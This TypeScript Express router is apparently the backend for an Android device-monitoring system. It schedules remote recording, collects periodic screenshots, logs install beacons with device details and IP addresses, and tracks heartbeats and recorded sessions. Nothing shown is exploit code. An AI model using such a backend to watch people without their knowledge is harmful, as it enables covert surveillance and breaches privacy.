        db.updateDeviceScreenshotSettings(client_id, auto_screenshot ? 1 : 0, interval || 30);
        res.json({ status: 'success' });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.post('/schedule', (req: Request, res: Response) => {
    try {
        const { client_id, start_time, stop_time, interval_hours } = req.body;
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }
        db.updateDeviceSchedule(client_id, start_time || "", stop_time || "");
        const interval = interval_hours ? parseInt(interval_hours, 10) : 2;
        console.log(`[broadcast] Schedule set for ${client_id}: start=${start_time}, stop=${stop_time}, interval=${interval}h`);

        // Instant 0ms push to connected device over WebSocket
        const pushed = sendDeviceCommand(client_id, 'SET_SCHEDULE', {
            start_time: start_time || "",
            stop_time: stop_time || "",
            interval_hours: interval
        });

        res.json({
            status: 'success',
            client_id,
            start_time,
            stop_time,
            interval_hours: interval,
            pushed_via_socket: pushed
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.post('/upload-screenshot', upload.single('image'), (req: Request, res: Response) => {
    try {
        const { client_id } = req.body;
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }
        if (!req.file) {
            res.status(400).json({ status: 'error', message: 'Missing image file' });
            return;
        }
        
        const dir = path.join(PUBLIC_DIR, 'screenshots');
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        
        fs.writeFileSync(path.join(dir, `${client_id}.jpg`), req.file.buffer);
        
        res.json({ status: 'success' });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// APP INSTALL BEACON (Tracks when client APK is first installed / activated)
// ════════════════════════════════════════════════════════════════════════════

router.post('/install-beacon', (req: Request, res: Response) => {
    try {
        const { client_id, device_model, manufacturer, os_version, app_version } = req.body || {};
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }

        const forwarded = req.headers['x-forwarded-for'];
        const ip = typeof forwarded === 'string' ? forwarded.split(',')[0].trim() : req.ip || req.socket.remoteAddress || '';

        const record = db.recordDeviceInstall(
            client_id,
            device_model || 'Unknown',
            manufacturer || 'Android',
            os_version || '',
            app_version || '',
            ip
        );

        console.log(`[broadcast] 📱 New App Install beacon recorded: ${record.manufacturer} ${record.device_model} (Client ID: ${record.client_id}) from IP ${ip}`);

        broadcastLiveEvent({
            type: 'new_install',
            data: record,
        });

        res.json({ status: 'ok', message: 'Install beacon recorded successfully', install: record });
    } catch (err: any) {
        console.error('[broadcast] Error recording install beacon:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// HOURLY DEVICE HEARTBEAT (Signals device is ALIVE without recording audio)
// ════════════════════════════════════════════════════════════════════════════

router.post('/heartbeat', (req: Request, res: Response) => {
    try {
        const { client_id, status, is_recording, battery, storage_mb, app_version, trigger_source } = req.body || {};
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }

        const forwarded = req.headers['x-forwarded-for'];
        const ip = typeof forwarded === 'string' ? forwarded.split(',')[0].trim() : req.ip || req.socket.remoteAddress || '';
        const now = new Date().toISOString();
        const effectiveStatus = is_recording ? 'recording' : (status || 'alive');

        db.recordDeviceHeartbeat(
            client_id,
            effectiveStatus,
            !!is_recording,
            typeof battery === 'number' ? battery : -1,
            typeof storage_mb === 'number' ? storage_mb : -1,
            app_version || '',
            trigger_source || 'hourly',
            ip
        );

        console.log(`[heartbeat] 💓 Device ${client_id} is ALIVE (Status: ${effectiveStatus}, Battery: ${battery ?? '?'}%, Recording: ${!!is_recording})`);

        broadcastLiveEvent({
            type: 'device_heartbeat',
            client_id,
            status: effectiveStatus,
            is_recording: !!is_recording,
            battery,
            storage_mb,
            timestamp: now,
        });

        res.json({
            status: 'ok',
            message: 'Heartbeat acknowledged: device confirmed alive',
            server_time: now,
        });
    } catch (err: any) {
        console.error('[broadcast] Error recording heartbeat:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// GET SESSION INFO (Must remain after /command to prevent route shadowing)
// ════════════════════════════════════════════════════════════════════════════

router.get('/:session_id', (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        const session = db.getSession(session_id);
        if (!session) {
            res.status(404).json({ status: 'not_found' });
            return;
        }

        const chunks = db.getSessionChunks(session_id);

        res.json({
            session,
            chunks_count: chunks.length,
            latest_sequence: chunks.length > 0 ? chunks[chunks.length - 1].sequence_num : -1,
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

export default router;

